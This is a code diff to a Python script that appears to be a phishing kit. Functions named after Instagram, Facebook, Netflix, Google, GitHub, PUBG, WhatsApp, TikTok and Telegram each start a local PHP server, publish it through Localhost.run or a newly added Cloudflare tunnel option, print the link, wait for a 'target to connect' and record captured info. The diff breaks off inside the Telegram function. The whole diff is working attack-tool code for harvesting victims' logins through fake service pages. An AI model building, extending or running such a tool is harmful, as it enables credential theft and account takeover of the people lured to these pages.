@@ -162,11 +162,21 @@ def instagram():
     os.chdir(rf"{path}/instagram")
 
 #====================================================================================================
-    print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
-{Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+    try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
 
-    link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
-    
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+
     try:
         
         
@@ -337,6 +347,21 @@ def facebook():
     os.chdir(rf"{path}/facebook")
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -354,26 +379,57 @@ def facebook():
     ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #Run Localhost====================================================================================================
     php_server()
-
+    
     sleep(1)
+    
+#Run Localhost.run====================================================================================================
 
-    loaclhost()
-    
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -473,6 +529,20 @@ def netflix():
     os.chdir(rf"{path}/Netflix")
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -491,26 +561,57 @@ def netflix():
 
 #Run Localhost====================================================================================================
     php_server()
-
+    
     sleep(1)
+    
+#Run Localhost.run====================================================================================================
 
-    loaclhost()
-    
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -611,6 +712,20 @@ def Google():
     os.chdir(rf"{path}/Google")
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -628,27 +743,58 @@ def Google():
     ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #Run Localhost====================================================================================================
     php_server()
-
+    
     sleep(1)
-
-    loaclhost()
     
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+#Run Localhost.run====================================================================================================
+
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
 
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
 #Write info====================================================================================================
     try:
         while True:
@@ -747,6 +893,20 @@ def Github():
     os.chdir(rf"{path}/Github")
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -764,26 +924,57 @@ def Github():
     ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #Run Localhost====================================================================================================
     php_server()
-
+    
     sleep(1)
+    
+#Run Localhost.run====================================================================================================
 
-    loaclhost()
-    
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
 
 #Write info====================================================================================================
     try:
@@ -881,6 +1072,20 @@ def Pubg():
     os.chdir(rf"{path}/Pubg")
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -898,26 +1103,57 @@ def Pubg():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
 #Run Localhost====================================================================================================
     php_server()
-
+    
     sleep(1)
+    
+#Run Localhost.run====================================================================================================
 
-    loaclhost()
-    
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
         
 #Write info====================================================================================================
     try:
@@ -1018,6 +1254,20 @@ def follower():
 
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -1034,29 +1284,59 @@ def follower():
     except ValueError:
         exit(f"""{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} Invalid Port !""")
-#Run Localhost ====================================================================================================
+#Run Localhost====================================================================================================
     php_server()
     
     sleep(1)
-
-    loaclhost()
     
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+#Run Localhost.run====================================================================================================
+
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
 
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
     
 #Write info====================================================================================================
     try:
@@ -1157,6 +1437,20 @@ def Whatsapp():
 
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -1177,26 +1471,56 @@ def Whatsapp():
     php_server()
     
     sleep(1)
-
-    loaclhost()
     
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+#Run Localhost.run====================================================================================================
+
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
 
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
-    
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
 #Write info====================================================================================================
     try:
         while True:
@@ -1279,6 +1603,20 @@ def Tiktok():
 
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -1299,25 +1637,55 @@ def Tiktok():
     php_server()
     
     sleep(1)
-
-    loaclhost()
     
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+#Run Localhost.run====================================================================================================
+
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
 #Generate Link====================================================================================================
 
-    line = linecache.getline(r"localhost.txt" , 24)
-    print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
-    sleep(0.1)
-    linecache.clearcache()
-    
-    Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        line = linecache.getline(r"localhost.txt" , 24)
+        print(f"\r{Fore.CYAN}Your URL :{Fore.LIGHTWHITE_EX}" , line.replace("tunneled with tls termination, " , " , "))
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\rwaiting for target to connect...\n".title() + Fore.RESET)
+        
+#Run Cloudflare====================================================================================================  
+    if link == 2:
+        
+        cloudfalre()
+        
+        try:
+            print(" ")
+            rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
+        except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+    ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+            
+        print("                          " , end="\r")
+        
+#Generate Link====================================================================================================
+        line = linecache.getline(r"localhost.txt" , 5)
+        
+        line = line.split()
+        
+        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        
+        sleep(0.1)
+        linecache.clearcache()
+        
+        Sprint(Fore.YELLOW + "\n\rwaiting for target to connect...\n".title() + Fore.RESET)
     
 #Write info====================================================================================================
     try:
@@ -1401,6 +1769,20 @@ def Telegram():
 
 #====================================================================================================
     try:
+        print(f"""\n{Fore.RED}[{Fore.LIGHTWHITE_EX}1{Fore.RED}]{Fore.LIGHTWHITE_EX} Localhost.run\n
+    {Fore.RED}[{Fore.LIGHTWHITE_EX}2{Fore.RED}]{Fore.LIGHTWHITE_EX} Cloudflare tunnel""" + Fore.RESET)
+
+        link = int(input(Fore.MAGENTA + "\nChoose your tunnel : " + Fore.RESET))
+        
+    except KeyboardInterrupt:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+    except EOFError:
+        exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+        
+#====================================================================================================
+    try:
         port = int(input(Fore.MAGENTA + f"\nWhich Port Want To Open {Fore.BLUE}({Fore.YELLOW}Default 80{Fore.BLUE}) {Fore.GREEN}⮞ " + Fore.RESET))
         if port > 65535:
             exit(f"""{Fore.YELLOW}│
@@ -1421,26 +1803,56 @@ def Telegram():
     php_server()
     
     sleep(1)
-
-    loaclhost()
     
-    try:
-        print(" ")
-        rotation(Fore.YELLOW + "Generating Link...".title()  + Fore.RESET)
-    except KeyboardInterrupt:
-        exit(f"""\n{Fore.YELLOW}│
-╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
+#Run Localhost.run====================================================================================================
+
+    if link == 1:
         
-    print("                          " , end="\r")
+        loaclhost()
+        
+        try:
+            print(" ")
